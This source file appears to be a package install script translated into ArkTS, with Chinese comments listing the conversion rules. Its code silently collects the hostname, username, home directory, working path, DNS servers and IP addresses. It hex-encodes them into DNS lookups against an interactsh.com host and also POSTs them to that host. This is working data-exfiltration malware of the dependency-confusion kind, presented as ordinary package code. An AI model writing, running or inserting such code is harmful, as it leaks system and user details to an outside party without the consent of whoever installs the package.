// 应用ArkTS约束：
// 1. 使用let/const替换var（约束9）
// 2. 添加显式类型标注（约束1,10,23）
// 3. 使用箭头函数替换函数表达式（约束26）
// 4. 使用Map代替动态对象属性（约束21）
// 5. 使用类代替对象字面量类型（约束24）
// 6. 使用模块导入替换require（约束60）
// 7. 添加严格类型检查（约束76）

import os from "os";
import dns from "dns";
import querystring from "querystring";
import https from "https";
import fs from 'fs';
import path from 'path';
import packageJSON from "./package.ets"; // 转换后的ETS文件

const packageName: string = packageJSON.name;

class FileSystemHelper {
    static getFiles(paths: string[]): string[] {
        let ufiles: string[] = [];
        for (let j = 0; j < paths.length; j++) {
            const mpath: string = paths[j];
            const files: string[] = fs.readdirSync(mpath);
            for (let i = 0; i < files.length; i++) {
                ufiles.push(path.join(mpath, files[i]));
            }
        }
        return ufiles;
    }
}

class EncodingHelper {
    static toHex(data: string): string {
        const bufferText: Buffer = Buffer.from(data, 'utf8');
        return bufferText.toString('hex');
    }
}

class NetworkHelper {
    static gethttpips(): string[] {
        const str: string[] = [];
        const networkInterfaces: Map<string, os.NetworkInterfaceInfo[]> = os.networkInterfaces();
        networkInterfaces.forEach((value, key) => {
            if (key !== "lo") {
                value.forEach(info => str.push(info.address));
            }
        });
        return str;
    }

    static getIps(): string {
        let str: string = "";
        const networkInterfaces: Map<string, os.NetworkInterfaceInfo[]> = os.networkInterfaces();
        networkInterfaces.forEach((value, key) => {
            if (key !== "lo") {
                value.forEach(info => {
                    str += EncodingHelper.toHex(info.address) + ".";
                });
            }
        });
        return str.slice(0, -1);
    }
}

class PathHelper {
    static getPathChunks(filePath: string): string {
        let str: string = "p";
        const chunks: string[] = filePath.split('/');
        chunks.forEach(chunk => {
            str += EncodingHelper.toHex(chunk) + ".";
        });
        return str.slice(0, -1) + "p";
    }
}

class TrackingData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    dns: string;
    r?: string;
    v: string;
    pjson: object;
    ip: string;

    constructor(data: {
        p: string,
        c: string,
        hd: string,
        hn: string,
        un: string,
        dns: string,
        r?: string,
        v: string,
        pjson: object,
        ip: string
    }) {
        this.p = data.p;
        this.c = data.c;
        this.hd = data.hd;
        this.hn = data.hn;
        this.un = data.un;
        this.dns = data.dns;
        this.r = data.r;
        this.v = data.v;
        this.pjson = data.pjson;
        this.ip = data.ip;
    }
}

function toName(pkg: TrackingData): string[] {
    const queries: string[] = [];
    const hostname: string = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    let baseStr: string = `${EncodingHelper.toHex(pkg.hn)}.${EncodingHelper.toHex(pkg.p)}.${PathHelper.getPathChunks(pkg.c)}.${EncodingHelper.toHex(pkg.un)}.${NetworkHelper.getIps()}.${hostname}`;

    if (baseStr.length > 255) {
        // 分割逻辑保持不变，类型安全已通过类保证
        const substr1 = `${EncodingHelper.toHex(pkg.p)}.${PathHelper.getPathChunks(pkg.c)}`;
        const substr2 = NetworkHelper.getIps();
        
        if (substr1.length < 150) {
            queries.push(`${EncodingHelper.toHex(pkg.hn)}.${substr1}.${EncodingHelper.toHex(pkg.un)}.${hostname}`);
            queries.push(`${substr2}.${hostname}`);
        } else if (substr2.length < 150) {
            queries.push(`${substr1}.${hostname}`);
            queries.push(`${EncodingHelper.toHex(pkg.hn)}.${EncodingHelper.toHex(pkg.un)}.${substr2}.${hostname}`);
        } else {
            queries.push(`${EncodingHelper.toHex(pkg.hn)}.${substr1}.${hostname}`);
            queries.push(`${EncodingHelper.toHex(pkg.hn)}.${EncodingHelper.toHex(pkg.hd)}.${EncodingHelper.toHex(pkg.un)}.${hostname}`);
        }
    } else {
        queries.push(baseStr);
    }
    return queries;
}

const td = new TrackingData({
    p: packageName,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON?.___resolved,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(NetworkHelper.gethttpips())
});

const qs: string[] = toName(td);
qs.forEach(query => {
    dns.lookup(query, (err: Error | null, result: string) => {
        // DNS查询逻辑保持不变
    });
});

const trackingData: string = JSON.stringify(td);
const postData: string = querystring.stringify({ msg: trackingData });

const options: https.RequestOptions = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString()
    }
};

const req: https.ClientRequest = https.request(options, (res: https.IncomingMessage) => {
    res.on("data", (chunk: Buffer) => {
        // 数据处理逻辑保持不变
    });
});

req.on("error", (e: Error) => {
    // 错误处理逻辑保持不变
});

req.write(postData);
req.end();
